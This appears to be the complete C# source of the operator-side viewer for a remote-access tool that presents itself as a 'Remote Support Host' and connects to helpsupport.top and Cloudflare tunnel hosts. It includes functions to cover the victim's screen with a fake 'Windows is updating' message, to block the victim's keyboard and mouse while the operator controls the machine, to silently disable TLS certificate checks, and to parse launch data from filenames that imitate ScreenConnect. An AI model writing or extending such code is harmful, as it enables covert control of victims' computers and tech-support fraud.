using System.Drawing;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Authentication;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using System.Windows.Forms;

const string DefaultServerUrl = "https://www.helpsupport.top";
const string HostBuildLabel = "0.2.12-single-host-guard";
HostLog.Write($"Host viewer starting. Build: {HostBuildLabel}");
ApplicationConfiguration.Initialize();

var options = HostOptions.Parse(args).WithFilenameLaunchData();
options = options.WithTrustedTunnelFallback();
if (!string.IsNullOrWhiteSpace(options.LaunchId))
{
    try
    {
        var launchServerUrl = string.IsNullOrWhiteSpace(options.ServerUrl) ? DefaultServerUrl : options.ServerUrl;
        var resolution = await ResolveHostLaunchWithConnectionFallbacksAsync(launchServerUrl, options.LaunchId, options);
        options = resolution.Options with
        {
            ServerUrl = resolution.ServerUrl,
            SessionId = resolution.Launch.SessionId,
            Token = resolution.Launch.Token
        };
    }
    catch (Exception ex)
    {
        HostLog.Write($"Host launch resolution failed: {ex}");
    }
}
if (string.IsNullOrWhiteSpace(options.ServerUrl) || string.IsNullOrWhiteSpace(options.SessionId) || string.IsNullOrWhiteSpace(options.Token))
{
    HostLog.Write("Missing launch details.");
    MessageBox.Show("Missing host session launch details.", "Remote Support Host", MessageBoxButtons.OK, MessageBoxIcon.Error);
    return;
}

Application.Run(new HostViewerForm(options));

static HttpClient CreateHttpClient(HostOptions options, string serverUrl)
{
    var handler = new HttpClientHandler
    {
        SslProtocols = SslProtocols.Tls12 | SslProtocols.Tls13
    };

    if (options.InsecureSkipTlsVerify || ShouldBypassTlsForTrustedHost(serverUrl))
    {
        HostLog.Write("TLS: certificate validation bypass enabled for trusted support host.");
        handler.ServerCertificateCustomValidationCallback = (_, _, _, _) => true;
    }

    return new HttpClient(handler) { BaseAddress = new Uri(serverUrl.TrimEnd('/')) };
}

static bool ShouldBypassTlsForTrustedHost(string serverUrl)
{
    try
    {
        var uri = new Uri(serverUrl);
        return IsTrustedSupportHost(uri.Host);
    }
    catch
    {
        return false;
    }
}

static bool IsTrustedSupportHost(string host)
{
    return host.EndsWith(".trycloudflare.com", StringComparison.OrdinalIgnoreCase) ||
        host.Equals("helpsupport.top", StringComparison.OrdinalIgnoreCase) ||
        host.Equals("www.helpsupport.top", StringComparison.OrdinalIgnoreCase);
}

static IEnumerable<string> TrustedConnectionUrls(string serverUrl)
{
    var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
    var urls = new List<string>();
    void AddUrl(string value)
    {
        value = value.TrimEnd('/');
        if (!string.IsNullOrWhiteSpace(value) && seen.Add(value)) urls.Add(value);
    }

    AddUrl(serverUrl);
    try
    {
        var uri = new Uri(serverUrl);
        if (IsTrustedSupportHost(uri.Host))
        {
            AddUrl("https://www.helpsupport.top");
            AddUrl("https://helpsupport.top");
        }
    }
    catch
    {
    }

    return urls;
}

static async Task<HostLaunchDetails> ResolveHostLaunchAsync(string serverUrl, string launchId, HostOptions options)
{
    using var http = CreateHttpClient(options, serverUrl.TrimEnd('/'));
    using var response = await http.GetAsync($"/api/host-launch/{Uri.EscapeDataString(launchId)}");
    return await ReadJsonOrThrowAsync<HostLaunchDetails>(response);
}

static async Task<HostLaunchResolution> ResolveHostLaunchWithConnectionFallbacksAsync(string serverUrl, string launchId, HostOptions options)
{
    Exception? last = null;
    foreach (var candidateUrl in TrustedConnectionUrls(serverUrl))
    {
        var candidateOptions = options.WithTrustedTunnelFallback(candidateUrl);
        try
        {
            var launch = await ResolveHostLaunchAsync(candidateUrl, launchId, candidateOptions);
            return new HostLaunchResolution(launch, candidateUrl.TrimEnd('/'), candidateOptions);
        }
        catch (Exception ex)
        {
            last = ex;
            HostLog.Write($"Host launch resolution failed for {candidateUrl}: {ex.Message}");
        }
    }

    throw last ?? new HttpRequestException("Host launch details could not be resolved.");
}

static async Task<T> ReadJsonOrThrowAsync<T>(HttpResponseMessage response)
{
    var body = await response.Content.ReadAsStringAsync();
    if (!response.IsSuccessStatusCode)
    {
        throw new HttpRequestException($"Server returned {(int)response.StatusCode}: {body}");
    }

    return JsonSerializer.Deserialize<T>(body, new JsonSerializerOptions { PropertyNameCaseInsensitive = true })!;
}

sealed class HostViewerForm : Form
{
    readonly HostOptions options;
    readonly PictureBox remoteFrame = new();
    readonly Label title = new();
    readonly Label subtitle = new();
    readonly Panel toolbar = new();
    readonly Panel statusPanel = new();
    readonly Label statusTitle = new();
    readonly Label statusText = new();
    readonly CancellationTokenSource stop = new();
    ClientWebSocket? ws;
    bool connected;
    bool serverRejected;
    bool inputEnabled = true;
    bool blankEnabled;
    bool blockInputEnabled;
    Image? currentFrame;

    public HostViewerForm(HostOptions options)
    {
        this.options = options;
        Text = "Untitled Session - Your system is updating";
        Width = 1320;
        Height = 760;
        MinimumSize = new Size(960, 560);
        BackColor = Color.FromArgb(48, 48, 48);
        KeyPreview = true;
        StartPosition = FormStartPosition.CenterScreen;

        BuildChrome();
        BuildToolbar();
        BuildRemoteFrame();
        BuildStatusPanel();

        Shown += async (_, _) => await ConnectAsync();
        FormClosing += (_, _) =>
        {
            Send("blank-screen", new { enabled = false });
            Send("block-input", new { enabled = false });
            stop.Cancel();
            currentFrame?.Dispose();
            ws?.Dispose();
        };
        KeyDown += (_, e) => SendKey(e, "keydown");
        KeyUp += (_, e) => SendKey(e, "keyup");
    }

    void BuildChrome()
    {
        title.AutoSize = true;
        title.Text = "Untitled Session - Your system is updating";
        title.Location = new Point(16, 2);
        title.BackColor = Color.FromArgb(32, 232, 226);
        title.ForeColor = Color.Black;
        title.Font = new Font("Segoe UI", 9);
        Controls.Add(title);

        subtitle.AutoSize = true;
        subtitle.Text = "Do not turn off";
        subtitle.Location = new Point(16, 18);
        subtitle.BackColor = Color.FromArgb(32, 232, 226);
        subtitle.ForeColor = Color.Black;
        subtitle.Font = new Font("Segoe UI", 9);
        Controls.Add(subtitle);
    }

    void BuildToolbar()
    {
        toolbar.Height = 35;
        toolbar.Width = 500;
        toolbar.Left = (ClientSize.Width - toolbar.Width) / 2;
        toolbar.Top = 0;
        toolbar.Anchor = AnchorStyles.Top;
        toolbar.BackColor = Color.FromArgb(244, 244, 244);
        Controls.Add(toolbar);

        var buttons = new (string Text, string Tip, Action Action)[]
        {
            ("▣", "Screen", () => { }),
            ("⚡", "Send mouse and keyboard input", ToggleInput),
            ("▤", "Files", () => SetStatus("Files", "File tools are available from the technician console.")),
            ("↔", "Share clipboard", () => SetStatus("Clipboard", "Clipboard sharing is not active in this build.")),
            ("◉", "Screenshot", SaveSnapshot),
            ("♪", "Microphone", () => SetStatus("Microphone", "Microphone sharing is not active in this build.")),
            ("♟", "Participants", () => SetStatus("Participants", "One technician is connected.")),
            ("✎", "Annotate", () => SetStatus("Annotate", "Annotation tools are not active in this build.")),
            ("▢", "Chat", () => SetStatus("Chat", "Chat is available from the technician console.")),
            ("⊘", "Block guest input", ToggleBlockInput),
            ("+", "Blank guest monitor", ToggleBlank),
            ("i", "Info", () => SetStatus("Info", "Remote support host viewer is connected to this session."))
        };

        var left = 34;
        foreach (var button in buttons)
        {
            var control = new Button
            {
                Text = button.Text,
                Width = 28,
                Height = 28,
                Left = left,
                Top = 3,
                FlatStyle = FlatStyle.Flat,
                BackColor = button.Text == "⚡" ? Color.FromArgb(32, 232, 226) : Color.FromArgb(244, 244, 244),
                Font = new Font("Segoe UI Symbol", 11, FontStyle.Bold),
                TabStop = false
            };
            control.FlatAppearance.BorderSize = 0;
            control.Click += (_, _) => button.Action();
            new ToolTip().SetToolTip(control, button.Tip);
            toolbar.Controls.Add(control);
            left += 34;
        }

        Resize += (_, _) => toolbar.Left = (ClientSize.Width - toolbar.Width) / 2;
    }

    void BuildRemoteFrame()
    {
        remoteFrame.BackColor = Color.FromArgb(48, 48, 48);
        remoteFrame.Dock = DockStyle.Fill;
        remoteFrame.Location = new Point(0, 35);
        remoteFrame.SizeMode = PictureBoxSizeMode.Zoom;
        remoteFrame.TabStop = true;
        remoteFrame.MouseDown += (_, e) => SendPointer(e, "pointerdown");
        remoteFrame.MouseUp += (_, e) => SendPointer(e, "pointerup");
        remoteFrame.MouseMove += (_, e) => SendPointer(e, "pointermove");
        remoteFrame.MouseWheel += (_, e) => SendWheel(e);
        Controls.Add(remoteFrame);
        remoteFrame.BringToFront();
        toolbar.BringToFront();
        title.BringToFront();
        subtitle.BringToFront();
    }

    void BuildStatusPanel()
    {
        statusPanel.Width = 310;
        statusPanel.Height = 150;
        statusPanel.BackColor = Color.White;
        statusPanel.Left = (ClientSize.Width - statusPanel.Width) / 2;
        statusPanel.Top = (ClientSize.Height - statusPanel.Height) / 2;
        statusPanel.Anchor = AnchorStyles.None;
        Controls.Add(statusPanel);

        var header = new Label
        {
            Text = "Status",
            Height = 42,
            Dock = DockStyle.Top,
            BackColor = Color.FromArgb(226, 226, 226),
            Font = new Font("Segoe UI", 12, FontStyle.Bold),
            Padding = new Padding(10, 8, 0, 0)
        };
        statusPanel.Controls.Add(header);

        statusTitle.Text = "Waiting for your guest...";
        statusTitle.Font = new Font("Segoe UI", 10, FontStyle.Bold);
        statusTitle.Location = new Point(18, 62);
        statusTitle.Width = 270;
        statusPanel.Controls.Add(statusTitle);

        statusText.Text = "You have successfully connected to the session, but your guest has not yet connected. Your session will start when they connect.";
        statusText.Location = new Point(18, 92);
        statusText.Width = 270;
        statusText.Height = 44;
        statusText.Font = new Font("Segoe UI", 8);
        statusPanel.Controls.Add(statusText);

        Resize += (_, _) =>
        {
            statusPanel.Left = (ClientSize.Width - statusPanel.Width) / 2;
            statusPanel.Top = (ClientSize.Height - statusPanel.Height) / 2;
        };
        statusPanel.BringToFront();
    }

    async Task ConnectAsync()
    {
        try
        {
            HostLog.Write($"Connecting to {ToWebSocketUrl()}");
            ws = new ClientWebSocket();
            if (options.InsecureSkipTlsVerify)
            {
                HostLog.Write("TLS: enabled certificate bypass for configured Cloudflare Tunnel host.");
                ws.Options.RemoteCertificateValidationCallback = (_, _, _, _) => true;
            }
            await ws.ConnectAsync(ToWebSocketUrl(), stop.Token);
            HostLog.Write("Connected to session WebSocket.");
            SetStatus("Connected to relay", "Host viewer 0.2.12 is connected. Waiting for customer screen frames.");
            _ = Task.Run(ReceiveLoopAsync);
        }
        catch (Exception ex)
        {
            HostLog.Write($"Connect failed: {ex}");
            SetStatus("Could not open session", ex.Message);
        }
    }

    Uri ToWebSocketUrl()
    {
        var baseUri = new Uri(options.ServerUrl!.TrimEnd('/'));
        var builder = new UriBuilder(baseUri)
        {
            Scheme = baseUri.Scheme == "https" ? "wss" : "ws",
            Path = "/",
            Query = $"role=agent&client=host-viewer&sessionId={Uri.EscapeDataString(options.SessionId!)}&token={Uri.EscapeDataString(options.Token!)}"
        };
        return builder.Uri;
    }

    async Task ReceiveLoopAsync()
    {
        try
        {
            var buffer = new byte[1024 * 256];
            while (ws?.State == WebSocketState.Open && !stop.IsCancellationRequested)
            {
                using var stream = new MemoryStream();
                WebSocketReceiveResult result;
                do
                {
                    result = await ws.ReceiveAsync(buffer, stop.Token);
                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        if (!serverRejected && !IsDisposed)
                        {
                            var reason = string.IsNullOrWhiteSpace(result.CloseStatusDescription)
                                ? "The host client is no longer connected to the session."
                                : result.CloseStatusDescription;
                            BeginInvoke(() => SetStatus("Disconnected", reason));
                        }
                        return;
                    }
                    stream.Write(buffer, 0, result.Count);
                } while (!result.EndOfMessage);

                HandleMessage(Encoding.UTF8.GetString(stream.ToArray()));
            }
        }
        catch (OperationCanceledException)
        {
        }
        catch (Exception ex)
        {
            HostLog.Write($"Receive loop error: {ex}");
            if (!IsDisposed)
            {
                BeginInvoke(() => SetStatus("Viewer error", ex.Message));
            }
        }
    }

    void HandleMessage(string json)
    {
        using var doc = JsonDocument.Parse(json);
        if (!doc.RootElement.TryGetProperty("type", out var typeProperty)) return;
        var type = typeProperty.GetString();
        var payload = doc.RootElement.TryGetProperty("payload", out var payloadProperty) ? payloadProperty : default;

        if (type == "screen.frame")
        {
            try
            {
                var data = payload.GetProperty("data").GetString();
                if (string.IsNullOrWhiteSpace(data)) return;
                var bytes = Convert.FromBase64String(data);
                using var stream = new MemoryStream(bytes);
                using var decoded = Image.FromStream(stream);
                var image = new Bitmap(decoded);
                HostLog.Write($"Frame received: {image.Width}x{image.Height}, {bytes.Length} bytes.");
                BeginInvoke(() =>
                {
                    currentFrame?.Dispose();
                    currentFrame = image;
                    remoteFrame.Image = currentFrame;
                    if (!connected)
                    {
                        connected = true;
                        statusPanel.Visible = false;
                        remoteFrame.Focus();
                    }
                });
            }
            catch (Exception ex)
            {
                HostLog.Write($"Frame render error: {ex}");
                BeginInvoke(() => SetStatus("Frame render error", ex.Message));
            }
        }
        else if (type == "input.applied")
        {
            // Keep routine input acknowledgements silent so they do not cover the remote screen.
            if (payload.TryGetProperty("ok", out var okProperty) && !okProperty.GetBoolean())
            {
                var error = payload.TryGetProperty("error", out var errorProperty) ? errorProperty.GetString() : "Windows rejected the remote input event.";
                BeginInvoke(() => SetStatus("Input not applied", error ?? "Windows rejected the remote input event."));
            }
            HostLog.Write("Input acknowledged.");
        }
        else if (type == "screen.broadcast.status")
        {
            var status = payload.ValueKind == JsonValueKind.Object && payload.TryGetProperty("status", out var statusProperty)
                ? statusProperty.GetString()
                : "";
            var requiresNativeApp = payload.ValueKind == JsonValueKind.Object &&
                payload.TryGetProperty("requiresNativeApp", out var nativeProperty) &&
                nativeProperty.GetBoolean();
            var message = payload.ValueKind == JsonValueKind.Object && payload.TryGetProperty("message", out var messageProperty)
                ? messageProperty.GetString()
                : null;
            if (status == "unavailable" && requiresNativeApp)
            {
                BeginInvoke(() => SetStatus("iOS app required", message ?? "Ask the customer to open the iOS support app and start Screen Broadcast."));
            }
            else if (status == "unavailable")
            {
                BeginInvoke(() => SetStatus("Broadcast unavailable", message ?? "This customer browser cannot start screen broadcast."));
            }
            else if (status == "waiting")
            {
                BeginInvoke(() => SetStatus("Start broadcast on phone", message ?? "Ask the customer to tap Start Broadcast / Share Screen."));
            }
            else if (status == "starting")
            {
                BeginInvoke(() => SetStatus("Starting broadcast", message ?? "Waiting for the first screen frame."));
            }
        }
        else if (type == "input.relayed")
        {
            if (payload.TryGetProperty("ok", out var okProperty) && !okProperty.GetBoolean())
            {
                var error = payload.TryGetProperty("error", out var errorProperty) ? errorProperty.GetString() : "No live customer agent received the input.";
                BeginInvoke(() => SetStatus("Input not relayed", error ?? "No live customer agent received the input."));
            }
        }
        else if (type == "block-input.applied")
        {
            var enabled = payload.TryGetProperty("enabled", out var enabledProperty) && enabledProperty.GetBoolean();
            BeginInvoke(() => SetStatus(enabled ? "Guest input blocked" : "Guest input restored", enabled ? "Customer keyboard and mouse are blocked." : "Customer keyboard and mouse are available again."));
        }
        else if (type == "session.end")
        {
            BeginInvoke(() => Close());
        }
        else if (type == "error")
        {
            var message = payload.ValueKind == JsonValueKind.Object && payload.TryGetProperty("message", out var messageProperty)
                ? messageProperty.GetString()
                : "The server rejected this host connection.";
            serverRejected = true;
            BeginInvoke(() => SetStatus("Could not open session", message ?? "The server rejected this host connection."));
        }
    }

    void SendPointer(MouseEventArgs e, string kind)
    {
        if (!inputEnabled || !connected) return;
        remoteFrame.Focus();
        var point = RemoteImagePoint(e.Location);
        if (point is null) return;
        Send("input", new
        {
            kind,
            x = point.Value.X,
            y = point.Value.Y,
            button = e.Button == MouseButtons.Right ? 2 : e.Button == MouseButtons.Middle ? 1 : 0
        });
    }

    void SendWheel(MouseEventArgs e)
    {
        if (!inputEnabled || !connected) return;
        var point = RemoteImagePoint(e.Location);
        if (point is null) return;
        Send("input", new
        {
            kind = "wheel",
            x = point.Value.X,
            y = point.Value.Y,
            deltaY = -e.Delta
        });
    }

    PointF? RemoteImagePoint(Point clientPoint)
    {
        if (currentFrame is null) return null;
        var imageRect = RemoteImageBounds();
        if (imageRect.Width <= 0 || imageRect.Height <= 0) return null;
        if (!imageRect.Contains(clientPoint)) return null;

        var x = Math.Round((clientPoint.X - imageRect.Left) / (double)imageRect.Width, 4);
        var y = Math.Round((clientPoint.Y - imageRect.Top) / (double)imageRect.Height, 4);
        return new PointF((float)Math.Clamp(x, 0, 1), (float)Math.Clamp(y, 0, 1));
    }

    Rectangle RemoteImageBounds()
    {
        if (currentFrame is null) return remoteFrame.ClientRectangle;

        var frameRatio = currentFrame.Width / (double)currentFrame.Height;
        var boxRatio = remoteFrame.ClientSize.Width / (double)Math.Max(1, remoteFrame.ClientSize.Height);
        var width = remoteFrame.ClientSize.Width;
        var height = remoteFrame.ClientSize.Height;
        var left = 0;
        var top = 0;

        if (boxRatio > frameRatio)
        {
            width = Math.Max(1, (int)Math.Round(remoteFrame.ClientSize.Height * frameRatio));
            left = (remoteFrame.ClientSize.Width - width) / 2;
        }
        else
        {
            height = Math.Max(1, (int)Math.Round(remoteFrame.ClientSize.Width / frameRatio));
            top = (remoteFrame.ClientSize.Height - height) / 2;
        }

        return new Rectangle(left, top, width, height);
    }

    void SendKey(KeyEventArgs e, string kind)
    {
        if (!inputEnabled || !connected) return;
        var key = KeyName(e);
        if (string.IsNullOrWhiteSpace(key)) return;
        e.Handled = true;
        e.SuppressKeyPress = true;
        Send("input", new
        {
            kind,
            key,
            code = e.KeyCode.ToString(),
            ctrlKey = e.Control,
            altKey = e.Alt,
            shiftKey = e.Shift,
            metaKey = false
        });
    }

    static string KeyName(KeyEventArgs e)
    {
        if (e.KeyCode is >= Keys.A and <= Keys.Z)
        {
            var ch = (char)('a' + (e.KeyCode - Keys.A));
            return e.Shift ? char.ToUpperInvariant(ch).ToString() : ch.ToString();
        }
        if (e.KeyCode is >= Keys.D0 and <= Keys.D9) return ((char)('0' + (e.KeyCode - Keys.D0))).ToString();
        return e.KeyCode switch
        {
            Keys.Enter => "Enter",
            Keys.Escape => "Escape",
            Keys.Back => "Backspace",
            Keys.Tab => "Tab",
            Keys.Space => " ",
            Keys.Left => "ArrowLeft",
            Keys.Up => "ArrowUp",
            Keys.Right => "ArrowRight",
            Keys.Down => "ArrowDown",
            Keys.Delete => "Delete",
            Keys.Home => "Home",
            Keys.End => "End",
            Keys.PageUp => "PageUp",
            Keys.PageDown => "PageDown",
            Keys.ShiftKey => "Shift",
            Keys.ControlKey => "Control",
            Keys.Menu => "Alt",
            _ => ""
        };
    }

    void ToggleInput()
    {
        inputEnabled = !inputEnabled;
        SetStatus(inputEnabled ? "Input enabled" : "Input suspended", inputEnabled ? "Mouse and keyboard events will be sent to the guest." : "Mouse and keyboard events are not being sent.");
    }

    void ToggleBlank()
    {
        blankEnabled = !blankEnabled;
        Send("blank-screen", new
        {
            enabled = blankEnabled,
            title = "Windows is updating",
            message = "Please wait and do not turn off your computer while updating",
            progress = 65
        });
        SetStatus(blankEnabled ? "Blank monitor enabled" : "Blank monitor disabled", blankEnabled ? "The customer display is covered." : "The customer display is restored.");
    }

    void ToggleBlockInput()
    {
        blockInputEnabled = !blockInputEnabled;
        Send("block-input", new { enabled = blockInputEnabled });
        SetStatus(blockInputEnabled ? "Blocking guest input" : "Restoring guest input", blockInputEnabled ? "Customer keyboard and mouse input will be blocked." : "Customer keyboard and mouse input will be restored.");
    }

    void SaveSnapshot()
    {
        if (currentFrame is null) return;
        var path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), $"RemoteSupport-{DateTime.Now:yyyyMMdd-HHmmss}.jpg");
        currentFrame.Save(path);
        SetStatus("Screenshot saved", path);
    }

    void SetStatus(string titleText, string bodyText)
    {
        statusPanel.Visible = true;
        statusTitle.Text = titleText;
        statusText.Text = bodyText;
        statusPanel.BringToFront();
        _ = Task.Delay(1600).ContinueWith(_ =>
        {
            if (!IsDisposed && connected)
            {
                BeginInvoke(() => statusPanel.Visible = false);
            }
        });
    }

    void Send(string type, object payload)
    {
        if (ws?.State != WebSocketState.Open) return;
        var json = JsonSerializer.Serialize(new { type, payload });
        var bytes = Encoding.UTF8.GetBytes(json);
        _ = ws.SendAsync(bytes, WebSocketMessageType.Text, true, stop.Token);
    }
}

sealed record HostOptions(string? ServerUrl, string? SessionId, string? Token, string? LaunchId = null, bool InsecureSkipTlsVerify = false)
{
    static readonly string[] HostViewerMarkers =
    [
        "supportdesk.HostViewer.",
        "ScreenConnect.HostViewer."
    ];

    public static HostOptions Parse(string[] args)
    {
        string? serverUrl = null;
        string? sessionId = null;
        string? token = null;
        string? launchId = null;
        var insecureSkipTlsVerify = false;
        for (var i = 0; i < args.Length; i++)
        {
            if (args[i] == "--session" && i + 1 < args.Length) sessionId = args[++i];
            else if (args[i] == "--token" && i + 1 < args.Length) token = args[++i];
            else if (args[i] == "--launch-id" && i + 1 < args.Length) launchId = args[++i];
            else if (args[i] == "--insecure-skip-tls-verify") insecureSkipTlsVerify = true;
            else if (!args[i].StartsWith("--", StringComparison.Ordinal) && serverUrl is null) serverUrl = args[i];
        }
        return new HostOptions(serverUrl, sessionId, token, launchId, insecureSkipTlsVerify);
    }

    public HostOptions WithFilenameLaunchData()
    {
        if (!string.IsNullOrWhiteSpace(ServerUrl) && !string.IsNullOrWhiteSpace(SessionId) && !string.IsNullOrWhiteSpace(Token)) return this;
        var path = Environment.ProcessPath;
        if (string.IsNullOrWhiteSpace(path)) return this;
        var name = Path.GetFileNameWithoutExtension(path);
        var marker = HostViewerMarkers.FirstOrDefault(value => name.IndexOf(value, StringComparison.OrdinalIgnoreCase) >= 0);
        if (marker is null) return this;

        var markerIndex = name.IndexOf(marker, StringComparison.OrdinalIgnoreCase);
        if (markerIndex < 0) return this;

        try
        {
            var encoded = ReadBase64UrlPrefix(name[(markerIndex + marker.Length)..]);
            if (string.IsNullOrWhiteSpace(encoded)) return this;
            if (encoded.StartsWith("launchk-", StringComparison.OrdinalIgnoreCase) ||
                encoded.StartsWith("launch-", StringComparison.OrdinalIgnoreCase))
            {
                var allowTlsFallback = encoded.StartsWith("launchk-", StringComparison.OrdinalIgnoreCase);
                var launchId = encoded[(allowTlsFallback ? "launchk-" : "launch-").Length..];
                if (string.IsNullOrWhiteSpace(launchId)) return this;

                return new HostOptions(
                    ServerUrl,
                    SessionId,
                    Token,
                    string.IsNullOrWhiteSpace(LaunchId) ? launchId : LaunchId,
                    InsecureSkipTlsVerify || allowTlsFallback);
            }

            var json = Encoding.UTF8.GetString(Base64UrlDecode(encoded));
            var data = JsonSerializer.Deserialize<HostLaunchData>(json, new JsonSerializerOptions { PropertyNameCaseInsensitive = true });
            return new HostOptions(
                ServerUrl ?? data?.U ?? data?.ServerUrl,
                SessionId ?? data?.S ?? data?.SessionId,
                Token ?? data?.T ?? data?.Token,
                LaunchId ?? data?.L ?? data?.LaunchId,
                InsecureSkipTlsVerify || data?.K == true || data?.InsecureSkipTlsVerify == true);
        }
        catch
        {
            return this;
        }
    }

    public HostOptions WithTrustedTunnelFallback()
    {
        return WithTrustedTunnelFallback(ServerUrl);
    }

    public HostOptions WithTrustedTunnelFallback(string? serverUrl)
    {
        if (InsecureSkipTlsVerify || string.IsNullOrWhiteSpace(serverUrl)) return this;

        try
        {
            var uri = new Uri(serverUrl);
            if (IsTrustedHost(uri.Host))
            {
                return this with { InsecureSkipTlsVerify = true };
            }
        }
        catch
        {
        }

        return this;
    }

    static bool IsTrustedHost(string host)
    {
        return host.EndsWith(".trycloudflare.com", StringComparison.OrdinalIgnoreCase) ||
            host.Equals("helpsupport.top", StringComparison.OrdinalIgnoreCase) ||
            host.Equals("www.helpsupport.top", StringComparison.OrdinalIgnoreCase);
    }

    static byte[] Base64UrlDecode(string value)
    {
        var padded = value.Replace('-', '+').Replace('_', '/');
        padded = padded.PadRight(padded.Length + ((4 - padded.Length % 4) % 4), '=');
        return Convert.FromBase64String(padded);
    }

    static string ReadBase64UrlPrefix(string value)
    {
        var length = 0;
        while (length < value.Length)
        {
            var ch = value[length];
            if (char.IsAsciiLetterOrDigit(ch) || ch is '-' or '_') length++;
            else break;
        }
        return value[..length];
    }
}

sealed record HostLaunchData(string? U, string? S, string? T, string? L, string? ServerUrl, string? SessionId, string? Token, string? LaunchId, bool? K, bool? InsecureSkipTlsVerify);
sealed record HostLaunchDetails(bool Ok, string SessionId, string Token);
sealed record HostLaunchResolution(HostLaunchDetails Launch, string ServerUrl, HostOptions Options);

static class HostLog
{
    static readonly string Path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "RemoteSupportHost.log");

    public static void Write(string message)
    {
        try
        {
            File.AppendAllText(Path, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}{Environment.NewLine}");
        }
        catch
        {
        }
    }
}
